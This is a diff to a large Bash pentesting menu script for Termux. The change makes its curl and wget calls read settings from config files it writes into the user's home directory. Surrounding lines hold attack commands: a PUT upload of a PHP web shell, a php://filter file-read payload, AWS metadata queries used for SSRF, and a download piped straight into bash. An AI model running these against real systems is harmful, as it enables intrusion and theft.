@@ -28,6 +28,10 @@ TDOM=""
 SANON=""
 USERAGENT=""
 COOKIE=""
+CURLCONFIG="$HOME""/.curlrc"
+WGETCONFIG="$HOME""/.wgetrc"
+CURLCOOKIE="$HOME""/.curlcookies"
+WGETCOOKIE="$HOME""/.wgetcookies"
 ANON="Disabled"
 SECL="$ENTRAW""danielmiessler/SecLists/master/"
 DISC="Discovery/Web-Content/"
@@ -35,21 +39,32 @@ GHWPL=("CMS/wordpress.fuzz.txt" "CMS/wp-plugins.fuzz.txt" "CMS/wp-themes.fuzz.tx
 APACH=("Apache.fuzz.txt" "ApacheTomcat.fuzz.txt" "apache.txt" "tomcat.txt")
 DIRLIST="directory-list-1.0.txt directory-list-2.3-big.txt directory-list-2.3-medium.txt directory-list-2.3-small.txt"
 
+if [[ -f "$WGETCONFIG" ]];
+then
+	mv "$WGETCONFIG" "$WGETCONFIG"".bak"
+fi
+echo -e "user_agent = Wget/1.21\nheader = Accept: */*\nheader = Accept-Encoding: identity\nheader = Connection: Keep-Alive" > $WGETCONFIG
+if [[ -f "$CURLCONFIG" ]];
+then
+	mv "$CURLCONFIG" "$CURLCONFIG"".bak"
+fi
+echo -e "User-Agent = \"curl/7.74.0\"\nheader = \"Accept: */*\"" > $CURLCONFIG
+
 function ScaricaIn
 {
 	if [[ -d "$ALD" ]];
 	then
-		wget --no-check-certificate "$1" -O "$ALD""$2"
+		wget --config $WGETCONFIG --no-check-certificate "$1" -O "$ALD""$2"
 	elif [[ -d "$AZD" ]];
 	then
-		wget --no-check-certificate "$1" -O "$AZD""$2"
+		wget --config $WGETCONFIG --no-check-certificate "$1" -O "$AZD""$2"
 	else
 		ls /storage
 		echo "Digit where download, remember the slash at the end of the path"
 		read -e -p "(example, /storage/emulated/legacy/Download/): " ATD
 		if [[ -d "$ATD" ]];
 		then
-			wget --no-check-certificate "$1" -O "$ATD""$2"
+			wget --config $WGETCONFIG --no-check-certificate "$1" -O "$ATD""$2"
 		fi
 	fi
 	echo "Downloaded ""$2"
@@ -229,9 +244,9 @@ function Controlla
 {
 	if [[ "$ANON" == "Enabled" ]];
 	then
-		curl -s -k -L -I --socks5 "$SANON" "$1"
+		curl --config $CURLCONFIG -s -k -L -I --socks5 "$SANON" "$1"
 	else
-		wget --no-check-certificate --spider "$1"
+		wget --config $WGETCONFIG --no-check-certificate --spider "$1"
 	fi
 }
 
@@ -239,9 +254,9 @@ function ScaricaWL
 {
 	if [[ "$ANON" == "Enabled" ]];
 	then
-		curl -s -k -L --socks5 "$SANON" "$1"
+		curl --config $CURLCONFIG -s -k -L --socks5 "$SANON" "$1"
 	else
-		wget --no-check-certificate "$1" -O -
+		wget --config $WGETCONFIG --no-check-certificate "$1" -O -
 	fi
 }
 
@@ -251,19 +266,19 @@ function Scarica
 	then
 		if [[ "$2" != "" ]];
 		then
-			curl -s -k -L --socks5 "$SANON" "$1" -o "$2"
+			curl --config $CURLCONFIG -s -k -L --socks5 "$SANON" "$1" -o "$2"
 		else
 			QUESTO="./"$(echo "$1" | awk -F "/" '{print $NF}')
-			curl -s -k -L --socks5 "$SANON" "$1" -o "$QUESTO"
+			curl --config $CURLCONFIG -s -k -L --socks5 "$SANON" "$1" -o "$QUESTO"
 			chmod +x "$QUESTO"
 		fi
 	else
 		if [[ "$2" != "" ]];
 		then
-			wget --no-check-certificate "$1" -O "$2"
+			wget --config $WGETCONFIG --no-check-certificate "$1" -O "$2"
 			chmod +x "./""$2"
 		else
-			wget --no-check-certificate "$1"
+			wget --config $WGETCONFIG --no-check-certificate "$1"
 			chmod +x "./"$(echo "$1" | awk -F "/" '{print $NF}')
 		fi
 	fi
@@ -2085,6 +2100,7 @@ while true; do
 		Stampa " 2658. XOR bitwise an array of chars converted in INT values"
 		Stampa " 2662. OR bitwise a string value" "2660. OR bitwise an array of chars converted in INT values"
 		echo " 2659. AND bitwise an array of chars converted in INT values"
+		Stampa " 2663. set User-Agent" "2664. set Headers" "2665. set Cookies"
 		echo "$SEP"
 	fi
 	echo "$CGT"" GT. VIRTUAL COINS - CURRENCIES"
@@ -2275,9 +2291,24 @@ while true; do
 	Stampa "Target: ""$TIP"":$TPRT" "Target domain: ""$TDOM" "Target username: ""$TUSRN"
 	Stampa "Target password: ""$TPSSW" "Wordlist: ""$WORDLIST" "YOU: ""$MIP"":$MPRT"
 	Stampa "Target URL: ""$TURL"
-	echo "User-Agent: ""$USERAGENT"
-	echo "Cookies: ""$WCOOKIE"
-	echo -e "\t""$CCOOKIE\n"
+	echo "Headers: "
+	if [[ -f $WGETCONFIG ]];
+	then
+		cat "$WGETCONFIG"
+	fi
+	if [[ -f $CURLCONFIG ]];
+	then
+		cat "$CURLCONFIG"
+	fi
+	echo "Cookies: "
+	if [[ -f $WGETCOOKIE ]];
+	then
+		cat "$WGETCOOKIE"
+	fi
+	if [[ -f $CURLCOOKIE ]];
+	then
+		cat "$CURLCOOKIE"
+	fi
 	echo "Anonymization: $ANON"
 	echo "$SEP"
 	Stampa " 0. exit" "2570. Anonymization"
@@ -3443,9 +3474,9 @@ while true; do
 				then
 					if [[ "$ANON" == "Enabled" ]];
 					then
-						curl -s -k -L --socks5 "$SANON" --url "$IMAPURL" --user "$EMAILADD" --request "$IMAPREQ"
+						curl --config $CURLCONFIG -s -k -L --socks5 "$SANON" --url "$IMAPURL" --user "$EMAILADD" --request "$IMAPREQ"
 					else
-						curl -s -k -L --url "$IMAPURL" --user "$EMAILADD" --request "$IMAPREQ"
+						curl --config $CURLCONFIG -s -k -L --url "$IMAPURL" --user "$EMAILADD" --request "$IMAPREQ"
 					fi
 				fi
 			fi
@@ -4956,9 +4987,9 @@ while true; do
 			then
 				if [[ "$ANON" == "Enabled" ]];
 				then
-					curl -s -k -L --socks5 "$SANON" "$URL""php://filter/convert.base64-encode/resource=""$PAGE"
+					curl --config $CURLCONFIG -s -k -L --socks5 "$SANON" "$URL""php://filter/convert.base64-encode/resource=""$PAGE"
 				else
-					curl -s -k -L "$URL""php://filter/convert.base64-encode/resource=""$PAGE"
+					curl --config $CURLCONFIG -s -k -L "$URL""php://filter/convert.base64-encode/resource=""$PAGE"
 				fi
 			fi
 		fi
@@ -5112,10 +5143,10 @@ while true; do
 			then
 				if [[ "$ANON" == "Enabled" ]];
 				then
-					curl -s -k -L --socks5 "$SANON" -v -X PUT -d '<?php system($_GET["cmd"]);?>' "$TURL""/""$SHL"".php"
+					curl --config $CURLCONFIG -s -k -L --socks5 "$SANON" -v -X PUT -d '<?php system($_GET["cmd"]);?>' "$TURL""/""$SHL"".php"
 
 				else
-					curl -s -k -L -v -X PUT -d '<?php system($_GET["cmd"]);?>' "$TURL""/""$SHL"".php"
+					curl --config $CURLCONFIG -s -k -L -v -X PUT -d '<?php system($_GET["cmd"]);?>' "$TURL""/""$SHL"".php"
 				fi
 			fi
 		fi
@@ -5203,13 +5234,13 @@ while true; do
 		Clona "s0md3v/Arjun"
 	;;
 	"622")
-		wget --no-check-certificate "$ENTRAW""1Tech-X/Auxilus.github.io/master/metasploit.sh" -O metasploit.sh && bash metasploit.sh
+		wget --config $WGETCONFIG --no-check-certificate "$ENTRAW""1Tech-X/Auxilus.github.io/master/metasploit.sh" -O metasploit.sh && bash metasploit.sh
 	;;
 	"623")
 		Clona "r0oth3x49/Xpath"
 	;;
 	"624")
-		wget --no-check-certificate "$ENTLAB""st42/termux-sudo/-/raw/master/sudo" -O /data/data/com.termux/files/usr/bin/sudo
+		wget --config $WGETCONFIG --no-check-certificate "$ENTLAB""st42/termux-sudo/-/raw/master/sudo" -O /data/data/com.termux/files/usr/bin/sudo
 		chmod 700 /data/data/com.termux/files/usr/bin/sudo
 	;;
 	"625")
@@ -5388,9 +5419,9 @@ while true; do
 		fi
 		if [[ "$ANON" == "Enabled" ]];
 		then
-			curl -s -k -L --socks5 "$SANON" "$TURL"":""$TDP""/version" | python -m json.tool
+			curl --config $CURLCONFIG -s -k -L --socks5 "$SANON" "$TURL"":""$TDP""/version" | python -m json.tool
 		else
-			curl -s -k -L "$TURL"":""$TDP""/version" | python -m json.tool
+			curl --config $CURLCONFIG -s -k -L "$TURL"":""$TDP""/version" | python -m json.tool
 		fi
 	;;
 	"653")
@@ -11061,9 +11092,9 @@ while true; do
 			export TOKEN=`curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "$TURL/latest/api/token"`
 			if [[ "$ANON" == "Enabled" ]];
 			then
-				curl -s -k -L --socks5 "$SANON" -H "X-aws-ec2-metadata-token:$TOKEN" -v "$TURL/latest/meta-data"
+				curl --config $CURLCONFIG -s -k -L --socks5 "$SANON" -H "X-aws-ec2-metadata-token:$TOKEN" -v "$TURL/latest/meta-data"
 			else
-				curl -s -k -L -H "X-aws-ec2-metadata-token:$TOKEN" -v "$TURL/latest/meta-data"
+				curl --config $CURLCONFIG -s -k -L -H "X-aws-ec2-metadata-token:$TOKEN" -v "$TURL/latest/meta-data"
 			fi
 		fi
 	;;
@@ -12775,56 +12806,96 @@ while true; do
 			then
 				if [[ "$CHOICE" == "custom" ]];
 				then
-					read -p "Digit a custom User-Agent: " USERAGENT
-					if [[ "$USERAGENT" != "" ]];
+					read -p "Digit a custom User-Agent: " SUSERAGENT
+					if [[ "$SUSERAGENT" != "" ]];
 					then
 						USERAGENT=""
-						USERAGENT="--user-agent \"""$USERAGENT""\""
+						USERAGENT="$SUSERAGENT"
 					fi
+				elif [[ "$CHOICE" == "reset" ]];
+				then
+					USERAGENT=""
 				else
 					USERAGENT=""
-					USERAGENT="--user-agent \"""$CHOICE""\""
+					USERAGENT="$CHOICE"
 				fi
 			fi
 			break
 		done
+		if [[ -f $WGETCONFIG ]];
+		then
+			rm $WGETCONFIG
+		fi
+		if [[ -f $CURLCONFIG ]];
+		then
+			rm $CURLCONFIG
+		fi
+		if [[ $HEADERS != "" ]];
+		then
+			for SHEADER in "${HEADERS[@]}"
+			do
+				if [[ "$SHEADER" != "" ]];
+				then
+					echo "header = ""$SHEADER" >> $WGETCONFIG
+					echo "header = \"""$SHEADER""\"" >> $CURLCONFIG
+				fi
+			done
+		fi
+		if [[ "$USERAGENT" != "" ]];
+		then
+			echo "user_agent = ""$USERAGENT" >> $WGETCONFIG
+			echo "User-Agent = \"""$USERAGENT""\"" >> $CURLCONFIG
+		fi
 	;;
 	"2664")
 		echo "Digit header to add into array"
 		while [[ "$HEADER" != "exit" ]];
 		do
 			HEADER=""
-			read -p "(digit 'exit' to 'finish', reset to clear HEADERS, without quotes): " HEADER
+			read -p "(digit 'exit' to finish, 'reset' to clear HEADERS, without quotes): " HEADER
 			if [[ "$HEADER" == "exit" ]];
 			then
 				break
 			elif [[ "$HEADER" == "reset" ]];
 			then
-				SHEADER=""
 				HEADERS=("")
+				SHEADER=""
 			else
 				HEADERS+=("$HEADER")
 			fi
 		done
-		for HDR in "${HEADERS[@]}"
-		do
-			if [[ "$SHEADER" != "" ]];
+		if [[ $HEADERS != "" ]];
+		then
+			if [[ -f $WGETCONFIG ]];
 			then
-				SHEADER="$SHEADER"" --header \"""$HDR""\""
-			else
-				SHEADER="--header \"""$HDR""\""
+				rm $WGETCONFIG
 			fi
-		done
+			if [[ -f $CURLCONFIG ]];
+			then
+				rm $CURLCONFIG
+			fi
+			for SHEADER in "${HEADERS[@]}"
+			do
+				if [[ "$SHEADER" != "" ]];
+				then
+					echo "header = ""$SHEADER" >> $WGETCONFIG
+					echo "header = \"""$SHEADER""\"" >> $CURLCONFIG
+				fi
+			done
+			if [[ "$USERAGENT" != "" ]];
+			then
+					echo "user_agent = ""$USERAGENT" >> $WGETCONFIG
+					echo "User-Agent = \"""$USERAGENT""\"" >> $CURLCONFIG
+			fi
+		fi
 	;;
 	"2665")
 		echo "Digit a valid Cookie value, dividing with semicolon ;"
 		read -p "(example, ): " COOKIE
 		if [[ "$COOKIE" != "" ]];
 		then
-			CCOOKIE=""
-			CCOOKIE="-b \"""$COOKIE""\""
-			WCOOKIE=""
-			WCOOKIE="--keep-session-cookies --save-cookies cookies.txt"
+			echo -e "keep_session_cookies = on\ncookies = on\nsave_cookies = ""$WGETCOOKIE""\nload_cookies = ""$WGETCOOKIE""\nheader = ""$COOKIE""\n" >> $WGETCONFIG
+			echo "$COOKIE" > $CURLCOOKIE
 		fi
 	;;
 	"AA")
